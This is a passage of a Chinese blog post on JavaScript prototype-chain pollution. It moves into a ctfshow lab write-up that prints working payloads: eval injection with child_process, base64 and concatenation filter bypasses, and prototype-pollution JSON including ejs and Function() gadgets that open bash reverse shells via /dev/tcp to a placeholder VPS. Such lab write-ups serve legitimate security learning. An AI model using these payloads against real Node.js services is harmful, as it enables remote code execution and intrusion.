alt="2024-10-17180552"></p><p>Apple类继承了Orange类的<code>b</code>属性，最后使得可以输出bbb</p><p>能造成是这样，是因为在调用<code>apple.b</code>时，JavaScript引擎进行如下的操作:</p><p>首先会在对象中寻找<code>b</code>这个对象，如果找不到的话，就会在<code>apple.__proto__</code>中寻找<code>b</code>,如果仍然找不到的话会继续<code>apple.__proto__..__proto__</code>寻找，依次寻找，直到找到<code>null</code>结束。例如<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></p><p>以上就是一个简单的JavaScript面向对象编程，主要需要牢记的是</p><p>1.每个构造函数(constructor)都有一个原型对象(prototype)</p><p>2.对象<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></p><p>3.JavaScript使用prototype链实现继承机制</p><h2 id="0x03-什么是原型链污染"><a class="markdownIt-Anchor" href="#0x03-什么是原型链污染"></a> 0x03 什么是原型链污染</h2><p>在0x01里面叙述过了<code>test.__proto__</code>指向的是<code>Test</code>类的<code>prototype</code>，那么如果修改了<code>test.__proto__</code>中的值，原理上应该也可以修改<code>Test</code> ,简单测试一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// foo是一个简单的JavaScript对象</span><br><span class="hljs-keyword">let</span> foo = &#123;<span class="hljs-attr">bar</span>: <span class="hljs-number">1</span>&#125;<br><br><span class="hljs-comment">// foo.bar 此时为1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br><br><span class="hljs-comment">// 修改foo的原型（即Object）</span><br>foo.<span class="hljs-property">__proto__</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">2</span><br><br><span class="hljs-comment">// 由于查找顺序的原因，foo.bar仍然是1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br><br><span class="hljs-comment">// 此时再用Object创建一个空的zoo对象</span><br><span class="hljs-keyword">let</span> zoo = &#123;&#125;<br><br><span class="hljs-comment">// 查看zoo.bar</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(zoo.<span class="hljs-property">bar</span>)<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/nodejs/2024-10-17195744.png" alt="2024-10-17195744"></p><p>可以发现即使没有给zoo是一个空对象，但是最后输出了2</p><p>这里的原理就是修改了<code>foo</code>的原型<code>foo.__proto__.bar</code>为2,foo是一个Object类的实例，实际上就是修改了类的属性，给这个类加上了<code>bar</code>这个属性，值为2</p><p>后者又用这个类创建了一个zoo的对象，由于所有的对象都是公用类的属性，即使zoo里面一开始没有bar这个属性，但是通过原生可以继承，zoo对象自然也有bar属性。</p><p>因此可以通过控制修改一个对象的原型从而影响来自同一个类，父族类的其他对象，这种攻击就是原型链污染。</p><h2 id="0x04-什么情况可以污染"><a class="markdownIt-Anchor" href="#0x04-什么情况可以污染"></a> 0x04 什么情况可以污染</h2><p>在实际应用中，需要思考哪些情况存在原型链可以攻击？</p><p>首先需要考虑在何种情况设置<code>__proto__</code>的值？可以找找能够控制数组(对象)的&quot;键名&quot;的操作即可：</p><p>对象merge:</p><p>对象clone:(内核就是将待操作的对象merge到一个空对象中)</p><p>以常见的merge为例，可以做一个简单的例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码的功能是将两个对象进行深度合并，逐级将 <code>source</code> 对象中的属性合并到 <code>target</code> 对象中。这个函数执行的是<strong>深度合并</strong>，当 <code>target</code> 和 <code>source</code> 都有同一个属性并且该属性是对象时，递归合并它们的属性。</p><p>在合并的过程中，存在赋值的操作<code>target[key] = source[key]</code>，那么，这个key如果是<code>__proto__</code>，就可以进行原型链的污染了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = &#123;<span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-attr">b</span>: <span class="hljs-number">2</span>&#125;&#125;<br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<br><br>o3 = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/nodejs/2024-10-17212623.png" alt="2024-10-17212623"></p><p>通过运行结果不难发现原型链并没有被污染</p><p>原因是用JavaScript创建o2的过程<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>中，<code>__proto__</code>已经代表了o2的原型了，此时遍历o2的所有键名，拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。(实际上是在将 <code>o2</code> 的原型设置为 <code>&#123;b: 2&#125;</code>。也就是说，<code>o2</code> 对象的原型链上存在 <code>&#123;b: 2&#125;</code>， <code>__proto__</code> 并不是 <code>o2</code> 自己的一个普通属性，<code>__proto__</code> 是一个特殊的属性，当你在对象字面量中使用 <code>__proto__</code> 时，它被解释为设置该对象的原型，而不是一个普通键值对。)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)<span class="hljs-comment">//强制认为是键值</span><br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<br><br>o3 = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/nodejs/2024-10-17222750.png" alt="2024-10-17222750"></p><p>新建的o3对象，也存在b属性，说明Object已经被污染.这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p><h2 id="0x05-靶场练习原型链从338"><a class="markdownIt-Anchor" href="#0x05-靶场练习原型链从338"></a> 0x05 靶场练习(原型链从338)</h2><h3 id="ctfshow-web334"><a class="markdownIt-Anchor" href="#ctfshow-web334"></a> ctfshow web334</h3><p>下载附件在user.js里面有账户密码，再看一下login.js文件定位关键代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">return</span> name!==<span class="hljs-string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="hljs-property">username</span> === name.<span class="hljs-title function_">toUpperCase</span>() &amp;&amp; item.<span class="hljs-property">password</span> === password;<br></code></pre></td></tr></table></figure><p>不可以等于，但是接受后可以转化为大写，所以输入<code>ctfshow</code>和<code>123456</code>即可</p><h3 id="ctfshow-web335"><a class="markdownIt-Anchor" href="#ctfshow-web335"></a> ctfshow web335</h3><p>先看源码会发现有提醒<code>?eval=</code>输入，尝试<code>ls</code>，没有文件，输入<code>1</code>有正常的文件，考虑本题是nodejs的题目，回归到官方的文档上，大概率考察的是这个<code>eval</code>函数</p><p><code>require(&quot;child_process&quot;)</code>:</p><p>这是 Node.js 中的内置模块，用于执行子进程。<code>child_process</code> 模块允许我们从 Node.js 脚本中执行系统命令或启动外部进程。</p><p><code>execSync()</code> 是 <code>child_process</code> 模块中的一个函数，用于以同步的方式执行 shell 命令。与 <code>exec()</code> 不同，<code>execSync()</code> 会等待命令执行完毕，并将其输出返回。使用同步方式时，程序会阻塞，直到命令执行完成。尝试执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">eval</span>=require(<span class="hljs-string">&quot;child_process&quot;</span>).execSync(<span class="hljs-string">&quot;ls&quot;</span>)<br></code></pre></td></tr></table></figure><p>得到flag的文本内容，再执行cat就可以了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">eval</span>=require(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;cat f*&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="ctfshow-web336"><a class="markdownIt-Anchor" href="#ctfshow-web336"></a> ctfshow web336</h3><h4 id="0x01"><a class="markdownIt-Anchor" href="#0x01"></a> 0x01</h4><p>同样的提示，传上题的payload会回显tql，简单的测试一下发现过滤了exec需要拼接绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">eval</span>=require(<span class="hljs-string">&quot;child_process&quot;</span>)[<span class="hljs-string">&#x27;exe&#x27;</span>%2B<span class="hljs-string">&#x27;cSync&#x27;</span>](<span class="hljs-string">&quot;ls&quot;</span>)<br></code></pre></td></tr></table></figure><p>然后正常执行</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?<span class="hljs-keyword">eval</span>=<span class="hljs-keyword">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>)[<span class="hljs-string">&#x27;exe&#x27;</span><span class="hljs-variable">%2B</span><span class="hljs-string">&#x27;cSync&#x27;</span>](<span class="hljs-string">&quot;cat f*&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="0x02"><a class="markdownIt-Anchor" href="#0x02"></a> 0x02</h4><p>可以进行base64转化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">eval</span>=<span class="hljs-built_in">eval</span>(Buffer.from(<span class="hljs-string">&quot;cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdjYXQgZmwwMDFnLnR4dCcp&quot;</span>,<span class="hljs-string">&#x27;base64&#x27;</span>).toString(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br></code></pre></td></tr></table></figure><p>把里面的命令base64加密<code>Buffer.from()</code> 将 base64 编码的字符串解码为一个缓冲区对象</p><h3 id="ctfshow-web337"><a class="markdownIt-Anchor" href="#ctfshow-web337"></a> ctfshow web337</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">var</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">s</span>) &#123;<br>  <span class="hljs-keyword">return</span> crypto.<span class="hljs-title function_">createHash</span>(<span class="hljs-string">&#x27;md5&#x27;</span>)<br>    .<span class="hljs-title function_">update</span>(s)<br>    .<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">/* GET home page. */</span><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;xxxxxxx&#x27;</span>;<br>  <span class="hljs-keyword">var</span> a = req.<span class="hljs-property">query</span>.<span class="hljs-property">a</span>;<br>  <span class="hljs-keyword">var</span> b = req.<span class="hljs-property">query</span>.<span class="hljs-property">b</span>;<br>  <span class="hljs-keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="hljs-property">length</span>===b.<span class="hljs-property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="hljs-title function_">md5</span>(a+flag)===<span class="hljs-title function_">md5</span>(b+flag))&#123;<br>  res.<span class="hljs-title function_">end</span>(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>,&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;tql&#x27;</span>&#125;);<br>  &#125;<br>  <br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><p>传入a和b，a和b要为真、a和b长度相等，a不等于b，a+flag和b+flag在md5后相等，则输出flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?a[x]=1&amp;b[x]=2<br></code></pre></td></tr></table></figure><h3 id="ctfshow-web338"><a class="markdownIt-Anchor" href="#ctfshow-web338"></a> ctfshow web338</h3><p>先分析源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><br><span class="hljs-comment">/* GET home page.  */</span><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).<span class="hljs-title function_">json</span>(),<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <br>  <span class="hljs-keyword">var</span> sess = req.<span class="hljs-property">session</span>;<br>  <br>  <span class="hljs-keyword">let</span> user = &#123;&#125;;<br>  <span class="hljs-keyword">var</span> secert = &#123;&#125;;<br>  <br>  utils.<span class="hljs-title function_">copy</span>(user,req.<span class="hljs-property">body</span>); <span class="hljs-comment">// 后者 req 的内容覆盖给 user </span><br> <span class="hljs-comment">// secert.__proto__ == user.__proto__</span><br>  <span class="hljs-keyword">if</span>(secert.<span class="hljs-property">ctfshow</span>===<span class="hljs-string">&#x27;36dboy&#x27;</span>)&#123;<br>    res.<span class="hljs-title function_">end</span>(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;登录失败&#x27;</span>+<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(user)&#125;);  <br>  &#125;<br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//common.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">copy</span>:copy<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">copy</span>(<span class="hljs-params">object1, object2</span>)&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> object2) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> object2 &amp;&amp; key <span class="hljs-keyword">in</span> object1) &#123;<br>            <span class="hljs-title function_">copy</span>(object1[key], object2[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            object1[key] = object2[key]<br>        &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>对<code>__proto__</code>进行污染就可以使ctfshow变成值了，下面具体步骤</p><p>在common.js文件里，进行了转化造成了原型链，因为原型污染，<code>secret</code>对象直接继承了Object.prototype，所以就导致了<code>secert.ctfshow==='36dboy'</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;ctfshow&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;36dboy&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/nodejs/2024-10-19230246.png" alt="2024-10-19230246"></p><h3 id="ctfshow-web339"><a class="markdownIt-Anchor" href="#ctfshow-web339"></a> ctfshow web339</h3><p>先上源码</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs json"># login.js<br>var express = require(&#x27;express&#x27;);<br>var router = express.Router();<br>var utils = require(&#x27;../utils/common&#x27;);<br><br>function User()<span class="hljs-punctuation">&#123;</span><br>  this.username=&#x27;&#x27;;<br>  this.password=&#x27;&#x27;;<br><span class="hljs-punctuation">&#125;</span><br>function normalUser()<span class="hljs-punctuation">&#123;</span><br>  this.user<br><span class="hljs-punctuation">&#125;</span><br><br><br><span class="hljs-comment">/* GET home page.  */</span><br>router.post(&#x27;/&#x27;<span class="hljs-punctuation">,</span> require(&#x27;body-parser&#x27;).json()<span class="hljs-punctuation">,</span>function(req<span class="hljs-punctuation">,</span> res<span class="hljs-punctuation">,</span> next) <span class="hljs-punctuation">&#123;</span><br>  res.type(&#x27;html&#x27;);<br>  var flag=&#x27;flag_here&#x27;;<br>  var sess = req.session;<br>  <br>  var secert = <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>;<br>  let user = <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>;<br>  <br>  utils.copy(user<span class="hljs-punctuation">,</span>req.body);<br>  <br>  if(secert.ctfshow===flag)<span class="hljs-punctuation">&#123;</span><br>    res.end(flag);<br>  <span class="hljs-punctuation">&#125;</span>else<span class="hljs-punctuation">&#123;</span><br>    return res.json(<span class="hljs-punctuation">&#123;</span>ret_code<span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span> ret_msg<span class="hljs-punctuation">:</span> &#x27;登录失败&#x27;+JSON.stringify(user)<span class="hljs-punctuation">&#125;</span>);  <br>  <span class="hljs-punctuation">&#125;</span><br>  <br>  <br><span class="hljs-punctuation">&#125;</span>);<br><br>module.exports = router;<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">//api.js</span><br>var express = require(&#x27;express&#x27;);<br>var router = express.Router();<br>var utils = require(&#x27;../utils/common&#x27;);<br><br><span class="hljs-comment">/* GET home page.  */</span><br>router.post(&#x27;/&#x27;<span class="hljs-punctuation">,</span> require(&#x27;body-parser&#x27;).json()<span class="hljs-punctuation">,</span>function(req<span class="hljs-punctuation">,</span> res<span class="hljs-punctuation">,</span> next) <span class="hljs-punctuation">&#123;</span><br>  res.type(&#x27;html&#x27;);<br>  res.render(&#x27;api&#x27;<span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span> query<span class="hljs-punctuation">:</span> Function(query)(query)<span class="hljs-punctuation">&#125;</span>);<br><span class="hljs-punctuation">&#125;</span>);<br><br>module.exports = router;<br></code></pre></td></tr></table></figure><p>common.js文件一样，也是造成污染的原因，分析一下代码</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">if(secert.ctfshow===flag)<br></code></pre></td></tr></table></figure><p>由于flag是未知量，不能和上题一样进行直接的修改</p><p>分析api.js，展示了一个基于 Express 的 POST 路由处理，它将用户输入（来自请求体的 <code>query</code> 字段）传递给 <code>Function()</code> 构造函数执行。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">Function(query)(query)<br></code></pre></td></tr></table></figure><p>这部分是代码的核心问题。<code>Function()</code> 构造函数的作用是将传入的字符串参数转化为可执行的函数，它的使用方式类似于 <code>eval()</code>，可以通过污染api原型造成远程的rce</p><h4 id="0x01-2"><a class="markdownIt-Anchor" href="#0x01-2"></a> 0x01</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;query&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx.xx.xxx.xxx/xxxxx 0&gt;&amp;1\&quot;&#x27;)&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>先在/login里面post发包进行污染，然后/api里面post发包就可以弹上了，最后一步头，污染失败可以再开一次容器</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/nodejs/2024-10-20000826.png" alt="2024-10-20000826"></p><p>剩下来找就行了在routes/login.js里</p><h4 id="0x02-2"><a class="markdownIt-Anchor" href="#0x02-2"></a> 0x02</h4><p>ejs模板漏洞导致rce,详情可参照p神博客的例题案例</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;outputFunctionName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/[vps-ip]/[port] 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>发包原理同0x01</p><h3 id="ctfshow-web340"><a class="markdownIt-Anchor" href="#ctfshow-web340"></a> ctfshow web340</h3><p>在login.js里多了这些内容</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">//login.js</span><br>  var user = new function()<span class="hljs-punctuation">&#123;</span><br>    this.userinfo = new function()<span class="hljs-punctuation">&#123;</span><br>    this.isVIP = <span class="hljs-literal"><span class="hljs-keyword">false</span></span>;<br>    this.isAdmin = <span class="hljs-literal"><span class="hljs-keyword">false</span></span>;<br>    this.isAuthor = <span class="hljs-literal"><span class="hljs-keyword">false</span></span>;     <br>    <span class="hljs-punctuation">&#125;</span>;<br>  <span class="hljs-punctuation">&#125;</span><br>    utils.copy(user.userinfo<span class="hljs-punctuation">,</span>req.body);<br>  if(user.userinfo.isAdmin)<span class="hljs-punctuation">&#123;</span><br>   res.end(flag);<br></code></pre></td></tr></table></figure><p>定位关键代码，<code>proto</code>原型多套一层就可以了</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">if(user.userinfo.isAdmin)<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;query&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps-ip/port 0&gt;&amp;1\&quot;&#x27;)&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>剩下的同上</p><h3 id="ctfshow-web341"><a class="markdownIt-Anchor" href="#ctfshow-web341"></a> ctfshow web341</h3><p>本题删除了api,login进行了微调</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 